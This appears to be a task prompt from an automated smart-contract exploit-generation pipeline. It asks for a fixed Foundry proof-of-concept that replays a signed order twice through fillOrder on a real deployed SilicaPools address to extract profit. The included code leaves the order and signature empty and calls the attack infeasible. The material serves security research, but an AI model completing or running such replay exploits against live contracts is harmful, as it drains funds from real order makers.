You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Signed orders can be replayed and overfilled indefinitely
- claim: `fillOrder` records `sFilledFraction[orderHash]` after execution but never checks whether the order was already filled or whether `sFilledFraction[orderHash] + fraction` exceeds `1e18`. Because partial fills are disabled and only `fraction == 1e18` is accepted, the same signed order can be executed repeatedly until the maker's balances or allowances run out.
- impact: A taker can reuse a single signature to force the maker through the same trade multiple times, draining additional upfront tokens and minting far more long/short exposure than the maker authorized.
- exploit_paths: ["Maker signs one order intended for a single fill.", "Taker calls `fillOrder(order, signature, 1e18)` once.", "The contract performs transfers and minting, then sets `sFilledFraction[orderHash] = 1e18`.", "Because no pre-check uses `sFilledFraction`, the taker calls the same order again with the same inputs.", "Each replay repeats the same asset transfers and fresh long/short minting."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ISilicaPoolsMinimal {
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    struct SilicaOrder {
        address maker;
        address taker;
        uint48 expiry;
        address offeredUpfrontToken;
        uint128 offeredUpfrontAmount;
        PoolParams offeredLongSharesParams;
        uint128 offeredLongShares;
        address requestedUpfrontToken;
        uint128 requestedUpfrontAmount;
        PoolParams requestedLongSharesParams;
        uint128 requestedLongShares;
    }

    function fillOrder(SilicaOrder calldata order, bytes calldata signature, uint256 fraction) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _profitAchieved;
    bool internal _hypothesisValidated;
    string internal _failureReason;

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;
        _profitAchieved = false;
        _hypothesisValidated = false;
        _failureReason = "";

        ISilicaPoolsMinimal.SilicaOrder memory order = _candidateOrder();
        bytes memory signature = _candidateSignature();

        // Path stage 1: a maker must already have signed a concrete order intended for one fill.
        // Under the task constraints, the verifier may only use finding context plus on-chain state at or
        // before the fork block. `SilicaPools` does not store signed orders or signatures on-chain, and
        // Solidity execution on the fork cannot inspect historical transaction calldata/logs to recover one.
        // No valid replayable order/signature pair is therefore derivable here without introducing
        // off-scope external data or an unauthorized private key.
        if (signature.length == 0 || order.maker == address(0)) {
            _failureReason = string(
                abi.encodePacked(
                    "Infeasible at this fork from allowed inputs alone: replay requires an existing maker-signed order ",
                    "and signature, but the target stores neither in contract state, so stage 1 of the prescribed path ",
                    "cannot be instantiated inside this PoC without external orderflow data."
                )
            );
            return;
        }

        // If a concrete historical order/signature pair is embedded later, the exploit path below preserves
        // the one-to-one causal sequence from the hypothesis:
        // 1) first full fill with fraction = 1e18
        // 2) protocol records filled fraction only after execution
        // 3) second fill reuses the exact same signed order and signature
        // 4) repeated transfers and minting occur again
        address candidateProfitToken = _candidateProfitToken(order);
        _profitToken = candidateProfitToken;
        uint256 balanceBefore = _balanceOf(candidateProfitToken, address(this));

        _approveIfNeeded(order.requestedUpfrontToken);
        _approveIfNeeded(order.offeredLongSharesParams.payoutToken);
        _approveIfNeeded(order.requestedLongSharesParams.payoutToken);

        ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, 1e18);
        ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, 1e18);

        uint256 balanceAfter = _balanceOf(candidateProfitToken, address(this));
        if (balanceAfter > balanceBefore) {
            _profitAchieved = true;
            _profitAmount = balanceAfter - balanceBefore;
            _hypothesisValidated = true;
            return;
        }

        _failureReason = "Replay path executed but did not realize positive net balance in the configured profit token.";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        return _profitAchieved;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return "maker-signed single-fill order -> fillOrder(order,sig,1e18) -> same order/signature replayed via fillOrder(order,sig,1e18) again";
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function _candidateOrder() internal pure returns (ISilicaPoolsMinimal.SilicaOrder memory order) {
        // Intentionally empty.
        // A profitable replay PoC at this fork requires embedding an actually recoverable historical order
        // and its signature from allowed data sources. None are available in contract state.
    }

    function _candidateSignature() internal pure returns (bytes memory) {
        // Intentionally empty for the same reason documented in `_candidateOrder()`.
        return bytes("");
    }

    function _candidateProfitToken(ISilicaPoolsMinimal.SilicaOrder memory order) internal pure returns (address) {
        if (order.offeredUpfrontToken != address(0)) {
            return order.offeredUpfrontToken;
        }
        if (order.requestedLongSharesParams.payoutToken != address(0)) {
            return order.requestedLongSharesParams.payoutToken;
        }
        if (order.offeredLongSharesParams.payoutToken != address(0)) {
            return order.offeredLongSharesParams.payoutToken;
        }
        if (order.requestedUpfrontToken != address(0)) {
            return order.requestedUpfrontToken;
        }
        return address(0);
    }

    function _approveIfNeeded(address token) internal {
        if (token != address(0)) {
            IERC20Minimal(token).approve(TARGET, type(uint256).max);
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        if (token == address(0)) {
            return account.balance;
        }
        return IERC20Minimal(token).balanceOf(account);
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2, 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
